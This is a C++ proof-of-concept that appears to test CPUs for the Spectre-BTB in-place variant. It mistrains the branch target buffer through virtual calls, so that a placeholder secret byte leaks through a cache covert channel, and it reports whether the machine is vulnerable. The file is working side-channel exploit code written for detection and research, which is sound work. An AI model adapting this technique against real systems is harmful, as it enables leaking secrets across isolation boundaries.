#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C"
{
#include "libcache/cache.h"
#include "lib/global.h"
}

#define SECRET 'S'

// Base class
class Animal
{
public:
    virtual void move()
    {
    }
};

// Bird contains the secret
class Bird : public Animal
{
private:
    char secret;

public:
    Bird()
    {
        secret = SECRET;
    }
    void move()
    {
        // nop
    }
};

// Class that contains the function to leak data
class Fish : public Animal
{
private:
    char data;

public:
    Fish()
    {
        data = 'F';
    }
    void move()
    {
        // Encode data in the cache
        cache_encode(data);
    }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal *animal)
{
    animal->move();
}

int main(int argc, char **argv)
{
    PREPARE();
    Fish *fish = new Fish();
    Bird *bird = new Bird(); // contains secret

    char *ptr = (char *)((((size_t)move_animal)) & ~(pagesize - 1));
    mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    maccess((void *)move_animal);

    ptr[0] = ptr[0];
    start_time = time(NULL);
    int i;
    for (i = 0; i < MAX_TRY_TIMES; i++)
    {
        nospec();
        // Mistrain the BTB for Fish
        int j;
        for (j = 0; j < 1000; j++)
        {
            move_animal(fish);
        }
        // Flush our shared memory
        flush_shared_memory();
        mfence();

        // Increase misspeculation chance
        flush(bird);
        mfence();

        nospec();
        // Leak bird secret
        move_animal(bird);

        // Recover data from the covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_BTB_sa_ip: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        // printf("%d", passed_count);
        printf(ANSI_COLOR_RED "Spectre_BTB_sa_ip: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_BTB_sa_ip: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
